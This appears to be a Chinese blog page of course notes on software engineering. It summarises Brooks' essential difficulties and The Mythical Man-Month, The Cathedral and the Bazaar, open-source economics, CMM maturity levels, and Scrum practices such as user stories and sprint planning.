<h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ol>
<li>软件实体可能⽐任何由⼈类创造的其他实体都要复杂，因为没有任何两个软件部分是相同的，如果有我们会将它们合并。</li>
<li>数字计算机本身就⽐⼈类建造的⼤多数东⻄复杂。计算机拥有⼤量的状态，这使得构思、描述和测试都⾮常困难。软件系统的状态⼜⽐计算机系统状态多若⼲个数量级。</li>
<li>软件实体的扩展也不仅仅是相同元素重复添加，⽽必须是不同元素实体的添加。整个软件的复杂度以很⼤的⾮线性级数增⻓。</li>
<li>软件的复杂度是必要属性，不是次要因素。抽掉复杂度的软件实体描述常常也去掉了⼀些本质属性</li>
</ol>
<ul>
<li><p>复杂度问题造成软件产品开发问题</p>
<ul>
<li><p>团队成员之间的沟通⾮常困难，导致了产品瑕疵、成本超⽀和进度延迟</p>
</li>
<li><p>由于复杂度，列举和理解所有可能的状态⼗分困难，影响了产品的可靠性</p>
</li>
<li><p>由于函数的复杂度，函数调⽤变得困难，导致程序难以使⽤</p>
</li>
<li><p>由于结构性复杂度，程序难以在不产⽣副作⽤的情况下⽤新函数扩充</p>
</li>
<li><p>由于结构性复杂度，造成很多安全机制状态上的不可⻅</p>
</li>
</ul>
</li>
<li><p>复杂度引发管理上的问题</p>
<ul>
<li>全⾯理解问题变得困难，从⽽妨碍了概念上的完整性</li>
<li>它使所有离散出⼝难以寻找和控制</li>
<li>它引起了⼤量学习和理解上的负担，使开发慢慢演变成了⼀场灾难</li>
</ul>
</li>
</ul>
<h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><ul>
<li>物理学家⾯对异常复杂的事物，他们坚信必定存在着某种通⽤原理。物理学是研究上帝创造的东⻄。</li>
<li>软件开发⾯对的复杂度往往是随⼼所欲、毫⽆规则可⾔的，来⾃若⼲必须遵循的⼈为惯例和系统。软件开发⾯对的是⼈，不是上帝。</li>
<li>很多复杂性来⾃保持与其他接⼝的⼀致。</li>
</ul>
<h3 id="可变性"><a href="#可变性" class="headerlink" title="可变性"></a>可变性</h3><ul>
<li>软件实体经常会遭受到持续的变更压⼒。</li>
<li>软件的变更<ul>
<li>⼈们要求扩展，更改功能</li>
<li>硬件的变化</li>
</ul>
</li>
<li>软件与整个社会联成⼀体，后者在不断变动，它强迫软件也跟着变动。</li>
</ul>
<h3 id="不可见性"><a href="#不可见性" class="headerlink" title="不可见性"></a>不可见性</h3><ul>
<li>软件是不可⻅的和⽆法可视化的</li>
<li>软件的客观存在不具有空间的形体特征：现在没有任何⼀种2维、3维的图形可以描述软件。</li>
<li>这限制了个⼈的设计过程，也严重的阻碍了相互之间的交流。</li>
<li>UML</li>
</ul>
<h2 id="当年的银弹"><a href="#当年的银弹" class="headerlink" title="当年的银弹"></a>当年的银弹</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107143637687.png" alt="image-20250107143637687"></p>
<h1 id="人月神话TheMythicalMan-Month"><a href="#人月神话TheMythicalMan-Month" class="headerlink" title="人月神话TheMythicalMan-Month"></a>人月神话TheMythicalMan-Month</h1><p><strong>Author：FredrickP.Brooks</strong></p>
<h2 id="进度"><a href="#进度" class="headerlink" title="进度"></a>进度</h2><p>在众多软件项目中，缺乏合理的时间进度是造成项目滞后的最主要原因，它比其他所有因素加起来的影响还大。</p>
<ul>
<li>首先，我们对估算技术缺乏有效的研究</li>
<li>第二，我们采用的估算技术隐含地假设人和月可以互换，错误地将进度与工作量相互混淆。</li>
<li>第三，由于对自己的估算缺乏信心，软件经理通常不会有耐心持续地进行估算这项工作。</li>
<li>第四，对进度缺少跟踪和监督。其他工程领域中，经过验证的跟踪技术和常规监督程序，在软件工程中常常被认为是无谓的举动。</li>
<li>第五，当意识到进度的偏移时，下意识（以及传统）的反应是增加人力。这就像使用汽油灭火一样，只会使事情更糟。越来越大的火势需要更多的汽油，从而进入了一场注定会导致灾难的循环。</li>
</ul>
<h2 id="乐观主义"><a href="#乐观主义" class="headerlink" title="乐观主义"></a>乐观主义</h2><ul>
<li>所有的编程人员都是乐观主义者</li>
<li>所有系统编程的进度安排背后的第一个假设是：一切都将运作良好，每一项任务仅花费它所“应该”花费的时间。</li>
<li>计算机编程基于十分容易掌握的介质，编程人员通过非常纯粹的思维活动——概念以及灵活的表现形式来开发程序。正由于介质的易于驾驭，我们期待在实现过程中不会碰到困难，因此造成了乐观主义的弥漫</li>
</ul>
<h2 id="人月"><a href="#人月" class="headerlink" title="人月"></a>人月</h2><ul>
<li><p>第二个谬误的思考方式是在估计和进度安排中使用的工作量单位：人月。</p>
</li>
<li><p>成本的确随开发产品的人数和时间的不同，有着很大的变化，进度却不是如此。因此我认为用人月作为衡量一项工作的规模是一个危险和带有欺骗性的神话。它暗示着人员数量和时间是可以相互替换的。</p>
</li>
<li><p>沟通所增加的负担由两个部分组成，培训和相互的交流。每个成员需要进行技术、项目目标以及总体策略上的培训。这种培训不能分解，因此这部分增加的工作量随人员的数量呈线性变化.</p>
</li>
<li><p>相互之间交流的情况更糟一些。如果任务的每个部分必须分别和其他部分单独协作，则工作量按照n(n-1)&#x2F;2递增。</p>
</li>
<li><p>因为软件开发本质上是一项系统工作——错综复杂关系下的一种实践——沟通、交流的工作量非常大，它很快会消耗任务分解所节省下来的个人时间。从而，添加更多的人手，实际上是延长了，而不是缩短了时间进度</p>
</li>
</ul>
<h2 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h2><ul>
<li><p>由于乐观主义，通常实际出现的缺陷数量比预料的要多得多。</p>
</li>
<li><p>进度安排：1&#x2F;3计划；1&#x2F;6编码；1&#x2F;4构件测试和早期系统测试；1&#x2F;4系统测试，所有的构件已完成</p>
<ul>
<li><p>分配给计划的时间比寻常的多。即便如此，仍不足以产生详细和稳定的计划规格说明，也不足以容纳对全新技术的研究和摸索。</p>
</li>
<li><p>对所完成代码的调试和测试，投入近一半的时间，比平常的安排多很多。</p>
</li>
<li><p>容易估计的部分，即编码，仅仅分配了六分之一的时间。</p>
</li>
</ul>
</li>
<li><p>不为系统测试安排足够的时间简直就是一场灾难。</p>
</li>
<li><p>直到项目的发布日期，才有人发现进度上的问题。</p>
</li>
<li><p>此时此刻的延迟具有不寻常的、严重的财务和心理上的反应。</p>
</li>
</ul>
<h2 id="空泛的估算"><a href="#空泛的估算" class="headerlink" title="空泛的估算"></a>空泛的估算</h2><ul>
<li>还没有可靠的估算技术出现。</li>
<li>在基于可靠基础的估算出现之前，项目经理需要挺直腰杆，坚持他们的估计，确信自己的经验和直觉总比从期望派生出的结果要强得多。</li>
</ul>
<h2 id="Brooks法则"><a href="#Brooks法则" class="headerlink" title="Brooks法则"></a>Brooks法则</h2><ul>
<li>向进度落后的项目中增加人手，只会使进度更加落后。</li>
<li>在众多软件项目中，缺乏合理的时间进度是造成项目滞后的最主要原因，它比其他所有因素加起来的影响还要大。</li>
</ul>
<h1 id="大教堂与集市TheCathedralAndTheBazaar"><a href="#大教堂与集市TheCathedralAndTheBazaar" class="headerlink" title="大教堂与集市TheCathedralAndTheBazaar"></a>大教堂与集市TheCathedralAndTheBazaar</h1><p><strong>埃里克·斯蒂芬·雷蒙（Eric Steven Raymond）1999</strong></p>
<h2 id="主要思想-1"><a href="#主要思想-1" class="headerlink" title="主要思想"></a>主要思想</h2><p>**大教堂：**一种是封闭的、垂直的、集中式的开发模式，反映一种由权利关系所预先控制的极权制度；</p>
<p>**集市：**一种并行的、点对点的、动态的开发模式。</p>
<p>他在文中论证了自由软件不仅仅是一种乌托邦的理想，而是在开发模式上真正代表着“先进生产力”，代表着历史发展趋势的必然。</p>
<h2 id="”大教堂“与”集市“"><a href="#”大教堂“与”集市“" class="headerlink" title="”大教堂“与”集市“"></a>”大教堂“与”集市“</h2><p>**大教堂：**传统的软件开发（本书限定在1990年以前）是“大教堂”模式，开发者在一个相对封闭的环境中进行设计和编码，直到产品基本完成、内部测试后，才会推向大众。软件的开发过程局限在项目组（一般是公司、实验室、科研单位等），在产品发布前，大众对此一无所知。</p>
<p>**集市：**Linux的诞生过程(1991年)后颠覆了传统模式，被作者称为”集市“模式，从项目启动伊始就将产品推向大众，并根据大众的反馈不断迭代，并且大众也可以为该项目贡献代码、提交缺陷。软件开发过程从项目组扩展为所有人。</p>
<h2 id="“集市”模式的开发方式"><a href="#“集市”模式的开发方式" class="headerlink" title="“集市”模式的开发方式"></a>“集市”模式的开发方式</h2><ul>
<li><p>**组织者描述产品，给出雏形。**任何对此产品有兴趣的开发者均可参与开发，开发过程是公开透明的，参与者可以看到项目的所有进展。</p>
</li>
<li><p>**快速迭代。**产品发布的频率极高，初期可达到每天一次，后期每周一次。紧张的交付周期可以鞭策开发者的开发效率。</p>
</li>
<li><p>**开源社区。**任何人都能拿到产品的源代码，任何人都可以是产品的贡献者。开发者是无私奉献的。</p>
</li>
<li><p>**开发阶段和测试阶段并行。**允许多人同时开发和测试，分布式的力量加速了项目的进展，且由于产品面向大众，任何人都是测试人员，“群众的眼睛是雪亮的，群众的力量是无穷的”。任何细小或深处的缺陷都能够被发现，因为这是产品使用时真实遇到的问题。同时，由于代码是开源的，人们指出问题时，可以将问题定位到代码行级，极大方便了开发人员修正缺陷。</p>
</li>
</ul>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux的影响是非常巨大的。甚至在５年以前，有谁能够想象一个世界级的操作系统能够仅仅依靠用细细的Internet连接起来的、散布在全球的几千个开发人员以业余时间来创造呢？</p>
<p>Linux推翻了许多我认为自己明白的事情。</p>
<p>我以前相信多数重要的软件（操作系统和象Emacs一样的真正大型的工具）需要象建造大教堂一样来开发，需要一群与世隔绝的奇才的细心工作，在成功之前没有beta版的发布。</p>
<p>LinusTorvalds的开发风格（尽早尽多的发布，委托所有可以委托的事，对所有的改动和融合开放）令人惊奇的降临了。</p>
<p>这里没有安静的、虔诚的大教堂的建造工作——相反，Linux团体看起来像一个巨大的有各种不同议程和方法的乱哄哄的集市（Linux归档站点接受任何人的建议和作品，并聪明的加以管理），一个一致而稳定的系统就象奇迹一般从这个集市中产生了。</p>
<h2 id="Fetchmail：Linux开发模式"><a href="#Fetchmail：Linux开发模式" class="headerlink" title="Fetchmail：Linux开发模式"></a>Fetchmail：Linux开发模式</h2><ol>
<li>每个好的软件工作都开始于搔到了开发者本人的痒处。</li>
<li>好程序员知道该写什么，伟大的程序员知道该重写（和重用）什么。</li>
<li>“计划好抛弃，无论如何，你会的”(FredBrooks,TheMythicalMan-Month,Chapter11）</li>
<li>如果你有正确的态度，有趣的问题会找上你的。</li>
<li>当你对一个程序失去兴趣时，你最后的责任就是把它传给一个能干的后继者。</li>
<li>把用户当做协作开发者是快速改进代码和高效调试的无可争辩的方式。</li>
<li>早发布、常发布、听取客户的建议。</li>
<li>**Linus定理：**如果有一个足够大的beta测试人员和协作开发人员的基础，几乎所有的问题都可以被快速的找出并被一些人纠正。（<strong>建造教堂和集市模式的核心区别</strong>）</li>
<li>聪明的数据结构和笨拙的代码要比相反的搭配工作的更好（自己编程的认识）。</li>
<li>如果你象对待最宝贵的资源一样对待你的beta测试员，他们就会成为你最宝贵的资源。</li>
</ol>
<p>（以下7条针对Fetchmail的开发）</p>
<ol start="11">
<li>想出好主意是好事，从你的用户那里发现好主意也是好事，有时候后者更好。</li>
<li>最重要和最有创新的解决方案常常来自于你认识到你对问题的概念是错误的。（你在开发中碰壁了，头破血流，反省后才能得到最好的解决方案）</li>
<li>“最好的设计不是再也没有什么东西可以添加了，而是再也没有什么东西可以去掉。”</li>
<li>任何工具都应该能以预想的方式使用，但是一个伟大的工具提供你没料到的功能。</li>
<li>当写任何种类的网关型程序时，多费点力，尽量少干扰数据流，永远不要抛弃信息，除非接收方强迫这么作!</li>
<li>如果你的语言一点也不象是图灵完备的，严格的语法会有好处。（rcfile,controlfilesyntax)</li>
<li>一个安全系统只能和它的秘密一样安全，当心伪安全。</li>
<li>要解决一个有趣的问题，请从发现让你感兴趣的问题开始。</li>
<li>如果开发协调人员有至少和Internet一样好的媒介，而且知道怎样不通过强迫来领导，许多头脑将不可避免地比一个好。</li>
</ol>
<h2 id="市集风格的必要的先决条件"><a href="#市集风格的必要的先决条件" class="headerlink" title="市集风格的必要的先决条件"></a>市集风格的必要的先决条件</h2><ul>
<li>不能以市集模式从头开发一个软件，我们可以以市集模式测试、调试和改进，但是以市集模式从头开始一个项目将是非常困难的。</li>
<li>当你开始创建社团时，你需要演示的是一个诺言，你的程序不需要工作的很好，它可以很粗糙、很笨拙、不完整和缺少文档、它不能忽略的东西是要吸引大家卷入一个有趣的项目。</li>
</ul>
<h1 id="开源软件经济学"><a href="#开源软件经济学" class="headerlink" title="开源软件经济学"></a>开源软件经济学</h1><p>替代物品是首选商品太贵时会改买的另一种东西。</p>
<p>互补物品是通常会和其它产品一起购买的产品。</p>
<ul>
<li>当商品的价格下降时互补物品的需求就会增加。</li>
<li>很多有责任尽量提升股东价值的大型上市公司，投入很多资金支持开放源码软件(通常是负担大型程序团队的开发费用)。而这正可以用互补物的原理来解释。</li>
<li>聪明的公司试图让产品的互补物普及化。IT顾问是企业软件的互补物品，IBM必须让企业软件普及化，因此支持开放源码软件。</li>
</ul>
<h1 id="Charactering-the-software-process"><a href="#Charactering-the-software-process" class="headerlink" title="Charactering the software process"></a>Charactering the software process</h1><p>**软件过程管理基本定律（CMM基本假设）：**如果开发过程可以在统计控制下，改进过程就可以导致更好的结果。将整个软件开发任务作为一个可控制，可度量，可改进的过程。</p>
<h2 id="提升软件能力-如何开发一个CMM框架"><a href="#提升软件能力-如何开发一个CMM框架" class="headerlink" title="提升软件能力&#x2F;如何开发一个CMM框架"></a>提升软件能力&#x2F;<strong>如何开发一个</strong>CMM框架</h2><ol>
<li>明白当前过程状态；</li>
<li>开发一个期望过程的版本；</li>
<li>按优先级建立要求的活动</li>
<li>制定完成活动的计划</li>
<li>提交资源完成计划。</li>
</ol>
<h2 id="SEI成熟度框架"><a href="#SEI成熟度框架" class="headerlink" title="SEI成熟度框架"></a>SEI成熟度框架</h2><ol>
<li><strong>初始级（Level1:Initial）</strong><ul>
<li>**特点：**过程是无序的、混乱的，依赖个人英雄主义。</li>
<li>**风险：**成功高度依赖特定人员，过程不可预测。</li>
<li>**示例：**大多数初创公司和早期项目。</li>
</ul>
</li>
<li><strong>已管理级（Level2:Managed）</strong><ul>
<li>**特点：**基本项目管理过程到位，可以规划和监控项目。</li>
<li>**成就：**在类似项目中可以重复过去的经验。</li>
<li>**示例：**有明确的需求、计划，但质量管理较弱。</li>
</ul>
</li>
<li><strong>已定义级（Level3:Defined）</strong><ul>
<li>**特点：**组织的过程被定义、文档化，所有项目使用标准过程。</li>
<li>**成就：**开发和维护过程标准化，具有组织级过程资产库。</li>
<li>**示例：**项目管理和开发遵循清晰的流程模板。</li>
</ul>
</li>
<li><strong>量化管理级（Level4:Quantitatively Managed）</strong><ul>
<li>**特点：**对过程进行定量管理和监控，强调可量化的目标。</li>
<li>**成就：**能够预测性能，识别并改进瓶颈。</li>
<li>**示例：**使用统计和量化技术优化质量和效率。</li>
</ul>
</li>
<li><strong>优化级（Level5:Optimizing）</strong><ul>
<li>**特点：**组织关注持续改进，能迅速适应变化。</li>
<li>**成就：**基于定量反馈和创新改进流程。</li>
<li>**示例：**持续的过程优化和创新，快速应对市场变化。</li>
</ul>
</li>
</ol>
<h1 id="Scrum"><a href="#Scrum" class="headerlink" title="Scrum"></a>Scrum</h1><h2 id="主要论点和结构"><a href="#主要论点和结构" class="headerlink" title="主要论点和结构"></a>主要论点和结构</h2><p><strong>与传统的瀑布模式不同，Scrum是一种迭代增量式的开发过程，用于敏捷开发。</strong></p>
<h2 id="Scrum3355框架"><a href="#Scrum3355框架" class="headerlink" title="Scrum3355框架"></a>Scrum3355框架</h2><ul>
<li><strong>三个角色</strong>：ScrumMaster、ProductOwner（产品负责人）和Team（团队）。•</li>
<li><strong>三个工件</strong>：ProductBacklog（产品待办事项）、SprintBacklog（Sprint待办事项）和可交付产品增量（也有说是燃尽图）。</li>
<li><strong>五大仪式（事件）</strong>：Sprint（冲刺）、SprintPlanning（Sprint规划）、SprintDailyStandup（每日站会）、SprintReview（Sprint评审）和SprintRetrospective（回顾）。</li>
<li><strong>五大价值观</strong>：Courage（勇气）、Openness（开放）、Focus（专注）、Commitment（承诺）和Respect（尊重）。</li>
</ul>
<h2 id="Scrum主要角色"><a href="#Scrum主要角色" class="headerlink" title="Scrum主要角色"></a>Scrum主要角色</h2><h3 id="产品负责人"><a href="#产品负责人" class="headerlink" title="产品负责人"></a>产品负责人</h3><p><strong>产品负责人</strong>负责确定产品目标、代表客户、划定优先级，是<strong>团队和客户进行交互</strong>的窗口；清晰的表达产品代办事项列表条目；对产品待办事项列表中的条目进行排序，最好地实现目标和使命；确保开发团队所执行工作的价值；确保产品待办事项列表对所有人可见、透明、清晰，并且显示Scrum团队的下一步工作；确保开发团队对产品待办事项列表中的条目达到一定程度的理解。</p>
<ul>
<li>产品负责人负责最大化产品以及开发团队工作的价值。产品负责人是唯一有权要求团队做事以及改变列表条目优先级的人。</li>
<li>持有产品愿景、代表业务（thebusiness）、代表客户、拥有产品列表、划定故事优先级、设立故事的接收标准、有空回答团队成员们的问题。</li>
<li>产品负责人和团队其他人之间有一层天生的紧张关系，产品负责人总想要更多，而团队则必须维护可持续的速率。只要不是单方面说了算，这层紧张关系就还是有益的。</li>
<li>不要合并产品负责人和scrummaster。</li>
<li>产品负责人是管理产品待办事项列表的唯一责任人。产品待办事项列表的管理包括:<ul>
<li>清晰地表达产品代办事项列表条目；</li>
<li>对产品代办事项列表中的条目进行排序,最好地实现目标和使命；</li>
<li>确保开发团队所执行工作的价值；</li>
<li>确保产品代办事项列表对所有人可见、透明、清晰,并且显示Scrum团队的下一步工作；</li>
<li>确保开发团队对产品代办事项列表中的条目达到一定程度的理解</li>
</ul>
</li>
</ul>
<h3 id="ScrumMaster"><a href="#ScrumMaster" class="headerlink" title="ScrumMaster"></a>ScrumMaster</h3><p><strong>ScrumMaster</strong>不是团队的老板，而是团队的守护者、引导者、捍卫者、谏言者和专家，致力于<strong>清除障碍</strong>，维护流程的有效性。知道团队自组织和跨功能；教导并领导开发团队创造高价值的产品；按需推动Scrum事件；在Scrum还未完全被采纳和理解的组织环境下指导开发团队。</p>
<ul>
<li>ScrumMaster负责确保Scrum被理解并实施。</li>
<li>Scrummaster担当教练角色，引领团队达到更高级的凝聚力、自组织和表现。ScrumMaster以各种方式服务于开发团队,包括:<ul>
<li>指导开发团队自组织和跨功能</li>
<li>教导并领导开发团队创造高价值的产品</li>
<li>移除开发团队进展过程中的障碍</li>
<li>按需推动Scrum事件</li>
<li>在Scrum还未完全被采纳和理解的组织环境下指导开发团队</li>
<li>CoachandTeacher</li>
</ul>
</li>
<li>Scrummaster也有可能一并担当直接贡献的责任。这种情况下我们称之为工作型(working)scrummaster，或贡献型(contributor)scrummaster。</li>
</ul>
<h3 id="开发团队成员"><a href="#开发团队成员" class="headerlink" title="开发团队成员"></a>开发团队成员</h3><p><strong>开发团队成员</strong>负责所有的<strong>开发工作</strong>，支配估算流程，专注于高质量交付。**不要微观管理（管得太细）。**不包括如测试或业务分析等负责特定领域的子团队。</p>
<ul>
<li><p>自组织团队选择如何最好地完成他们的工作,而不是由团队外的其他人来指使他们。</p>
<ul>
<li>《为什么我们需要自组织团队》提出必须让团队竭尽他们所有的专业能力，不仅仅是完成他们的工作任务，还要自我监督和控制，自己做决定，甚至设计自己的流程。</li>
<li>自组织性高的团队往往也能够比其他团队带来更多的好处，比如能够传递更多的商业价值、更加高效地协同工作以及学的更快等。</li>
<li>降低管理成本！</li>
</ul>
</li>
<li><p>全功能团队拥有完成工作所需要的全部技能,不需要依赖团队外部的人（特性团队）。</p>
<ul>
<li>全功能团队是具有不同职能专业或多学科技能的团队。当一个团队拥有满足需求的所有技能和资源时，就称为真正的跨职能。这意味着它不依赖于跟其他团队的工作交接，也不用等待其他团队的工作。</li>
<li>特性团队：一种组建跨职能团队的常见方式是让团队对某个特性负责。有些人将其称之为特性团队。这个团队对于某个特性从开始到结束全程负责。</li>
</ul>
</li>
</ul>
<h4 id="微观管理及其危害"><a href="#微观管理及其危害" class="headerlink" title="微观管理及其危害"></a>微观管理及其危害</h4><p>微观管理（Micromanagement）一般是指：在对员工的工作管理中，管理者过度关注和控制工作细节的管理风格和管理行为。</p>
<p>客观地说，关注细节并非坏事。但是一旦过于关注和控制细节，就会带来种种问题：</p>
<ol>
<li>第一，会导致团队成员失去主观能动性。由于完全沦为执行者，导致员工只能按照管理者的思路走，从而失去了自主性和创造力。</li>
<li>第二，会导致工作中出现决策等待和低效。当实际工作场景与管理者最初设想的不一致时，员工无法继续按照管理者最初的思路工作，就只能把问题反馈给管理者，等待管理者作出决策。</li>
<li>第三，会影响到团队的积极性和士气。由于团队成员经常处于要向管理者汇报的压力中，经常处于被管理者纠偏的状态，很容易让团队成员感到不自信和缺乏成就感。</li>
</ol>
<p>微观管理是打造自组织团队的最大障碍之一。</p>
<h2 id="猪与鸡的比喻"><a href="#猪与鸡的比喻" class="headerlink" title="猪与鸡的比喻"></a>猪与鸡的比喻</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107152029010.png" alt="image-20250107152029010"></p>
<p>猪角色被认为是团队中的核心成员,在一个团队中产品的负责人和Scrum主管和开发团队就是“猪”角色。鸡角色不是Scrum的一部分,但必须要考虑他们，用户，客户或提供商，经理等扮演着“鸡”角色!</p>
<p>把有兴趣关心，并无利益或价值牵扯的人，排除在项目决策团队以外！</p>
<h2 id="用户故事"><a href="#用户故事" class="headerlink" title="用户故事"></a>用户故事</h2><p>用户故事是产品列表的基础构件。</p>
<p>用户故事模板（不是唯一方法）：</p>
<ul>
<li>用户角色(who):</li>
<li>功能(what):</li>
<li>为什么(why):</li>
</ul>
<h3 id="3C原则"><a href="#3C原则" class="headerlink" title="3C原则"></a>3C原则</h3><ul>
<li><strong>卡片(Card)（placeholder，占位符）</strong>：在一堆卡片上写下你期望的软件特性</li>
<li><strong>交谈(Conversation)</strong>：聚在一起对要开发的软件进行深人讨论</li>
<li><strong>确认(Confirmation)</strong>：对完工条件进行确认</li>
</ul>
<p>用户故事不是完整的需求或说明书，它们是占位符。</p>
<p>它们的信息量足以提醒团队有东西要完成，但我们刻意地不过多探讨细节……直到必需之时。</p>
<h3 id="DoD（DefinitionofDone）"><a href="#DoD（DefinitionofDone）" class="headerlink" title="DoD（DefinitionofDone）"></a>DoD（DefinitionofDone）</h3><p>“DefinitionofDone”（DoD，完成的定义）是敏捷软件开发中的一个关键概念，用于描述一个用户故事、任务或功能何时可以被认为真正“完成”。它是团队对完成工作的标准化定义，确保开发过程中每个增量都符合质量要求并准备好交付。</p>
<ol>
<li>提高透明度：DoD明确了完成的标准，减少了团队之间的沟通误解。</li>
<li>保证质量：通过对代码质量、测试和文档的明确要求，确保产出的增量软件可用且可靠。</li>
<li>支持验收流程：DoD是验收用户故事或功能的依据。如果工作未达到DoD，任务不能被标记为完成。</li>
<li>防止技术债：通过明确完成标准，避免开发过程中留下未解决的问题。</li>
</ol>
<h3 id="行为驱动开发（BDD）"><a href="#行为驱动开发（BDD）" class="headerlink" title="行为驱动开发（BDD）"></a>行为驱动开发（BDD）</h3><p>行为驱动开发（BDD）是一种基于敏捷的软件开发方法论，其核心思想是通过定义软件的行为来驱动开发过程。BDD的重点是增强团队对需求的理解，并确保开发的软件满足业务目标。</p>
<p>BDD是从测试驱动开发（TDD）演化而来的，强调在开发开始之前，用自然语言描述软件应如何行为。它通过让技术人员、业务人员和测试人员围绕共同的需求语言进行协作，消除了沟通中的歧义。</p>
<h4 id="BDD的实践流程"><a href="#BDD的实践流程" class="headerlink" title="BDD的实践流程"></a>BDD的实践流程</h4><ol>
<li>编写用户故事</li>
<li>定义验收标准：验收标准是用户故事“完成”的具体条件，通常以场景的形式定义。</li>
</ol>
<h3 id="用户故事INVEST原则"><a href="#用户故事INVEST原则" class="headerlink" title="用户故事INVEST原则"></a>用户故事INVEST原则</h3><ol>
<li>独立性（Independent）：要尽可能的让一个用户故事独立于其他的用户故事。</li>
<li>可协商性（Negotiable）：一个用户故事的内容要是可以协商的，用户故事不是合同。</li>
<li>有价值（Valuable）：每个故事必须对客户具有价值（无论是用户还是购买方）。</li>
<li>可以估算性（Estimable）：—开发团队需要去估计一个用户故事以便确定优先级，工作量，安排计划。</li>
<li>短小（Small）：一个好的故事在工作量上要尽量短小，至少要确保的是在一个迭代或Sprint中能够完成。</li>
<li>可测试性（Testable）：一个用户故事要是可以测试的，以便于确认它是可以完成的。</li>
</ol>
<h3 id="产品Backlog"><a href="#产品Backlog" class="headerlink" title="产品Backlog"></a>产品Backlog</h3><p>产品Backlog是Scrum的核心，是按重要性排序的需求或故事（Story）的列表（客户语言描述的客户需求）</p>
<p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107152859899.png%22alt=%22image-20250107152859899%22style=%22zoom:50%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107152859899.png&quot;alt=&quot;image-20250107152859899&quot;style=&quot;zoom:50%;&quot;/&gt;</a></p>
<h3 id="用户故事地图"><a href="#用户故事地图" class="headerlink" title="用户故事地图"></a>用户故事地图</h3><p>用户故事地图是一门在需求拆分过程中保持全景图的技术。敏捷软件开发中使用用户故事地图来发现、管理需求。</p>
<p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107152936058.png%22alt=%22image-20250107152936058%22style=%22zoom:50%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107152936058.png&quot;alt=&quot;image-20250107152936058&quot;style=&quot;zoom:50%;&quot;/&gt;</a></p>
<h4 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h4><ol>
<li>**全局视角缺失：**传统的待办事项列表（Backlog）往往只关注单个功能，缺乏对整体产品的全局视角，导致团队难以理解产品的整体结构和用户体验流程。用户故事地图通过横向展示用户活动，纵向排列功能细节，提供了产品的全貌视图，帮助团队更好地理解用户的使用路径。</li>
<li>**需求优先级难以确定：**在复杂的项目中，众多需求可能让团队难以确定哪些功能应优先开发。用户故事地图通过将用户故事按照用户活动和任务进行组织，清晰地展示各功能的相对重要性，便于团队合理安排开发顺序。</li>
<li>**缺乏用户需求聚焦：**开发过程中，团队可能过于关注技术实现，忽视了用户的真实需求。用户故事地图强调从用户角度出发，确保开发的功能真正满足用户需求，提升用户满意度。</li>
<li>**难以理解功能之间的关系：**在大型项目中，不同功能之间的关系可能复杂，团队难以把握。用户故事地图通过结构化的方式展示功能之间的关联，帮助团队更好地理解和管理这些关系。</li>
<li>**发布计划不明确：**在敏捷开发中，确定每次发布的功能范围至关重要。用户故事地图通过清晰地展示各功能的优先级和依赖关系，帮助团队制定合理的发布计划，确保每次发布都能为用户提供有价值的功能。</li>
</ol>
<h2 id="Sprint计划"><a href="#Sprint计划" class="headerlink" title="Sprint计划"></a>Sprint计划</h2><h3 id="会议准备"><a href="#会议准备" class="headerlink" title="会议准备"></a>会议准备</h3><ul>
<li>所有重要的backlog条目都已经根据重要性被评过分,不同的重要程度对应不同的分数。分数只是用来根据重要性对backlog条目排序。</li>
<li>所有人都可以编写添加条目，但只有ProductOwner才能决定优先级。</li>
</ul>
<h3 id="会议目标"><a href="#会议目标" class="headerlink" title="会议目标"></a>会议目标</h3><p>以终为始</p>
<ul>
<li>sprint目标（尽可能简单的语言，团队成员认同）。</li>
<li>团队成员名单(以及他们的投入程度,如果不是100%的话)。</li>
<li>sprintbacklog(即sprint中包括的故事列表)。</li>
<li>确定好sprint演示日期。</li>
<li>确定好时间地点,供举行每日scrum会议。</li>
</ul>
<p><strong>为什么PO需要参加会议？</strong></p>
<p>每个故事都含有三个变量（<strong>范围、重要性和估算</strong>），他们两两之间对彼此有着强烈依赖，范围和重要性由PO设置，估算由团队设置，在Sprint计划会议上，经过团队和PO面对面对话，这三个变量会逐步得到调整优化。</p>
<h3 id="一个Sprint多长？"><a href="#一个Sprint多长？" class="headerlink" title="一个Sprint多长？"></a>一个Sprint多长？</h3><p>确定Sprint长度：Sprint持续多久才算合适？</p>
<ul>
<li><p>时间短：“敏捷”——短反馈周期&#x3D;频繁交付&#x3D;频繁客户反馈&#x3D;错误方向持续时间短&#x3D;学习改进速度快……</p>
</li>
<li><p>时间长：更多时间作充分准备、解决问题、达成目标，不会被接二连三的会议压的不堪重负。</p>
</li>
</ul>
<p>当前，Scrum周期通常为<strong>2个星期</strong>。</p>
<h3 id="估算"><a href="#估算" class="headerlink" title="估算"></a>估算</h3><p>根据软件的开发内容、开发工具、开发人员等因素对需求分析、软件设计、编码、测试与整个开发过程所花费的时间、费用及工作量的预测。确定开发时间和开发成本的过程。<strong>估算的偏差</strong>是必然会存在的，估算不在于精确而在于有用。估算是一种手段，为了计划、项目管理。</p>
<ul>
<li>估算是很困难的，因为这是在预测未来。而历史证明，我们的估算经常是错误的—误差巨大，而且在很多时候都是这样。</li>
<li>估算经常是错误的，但是估算过程仍然是有用的。估算过程是管理前方的不确定性的契机，它可以被当做风险管理的工具，让你可以发现误解、不一致以及需要进一步调査的地方。</li>
<li>团队共同完成估算可以让大家建立对工作一致的理解。但是，根据收益递减原理，你不应在估算上花太多的时间。你可以做出一个快速但不那么准确的估计，也可以再多花一点时间做一个更准确的估计，但花上几天的时间得出精确的小时数就没用了。</li>
</ul>
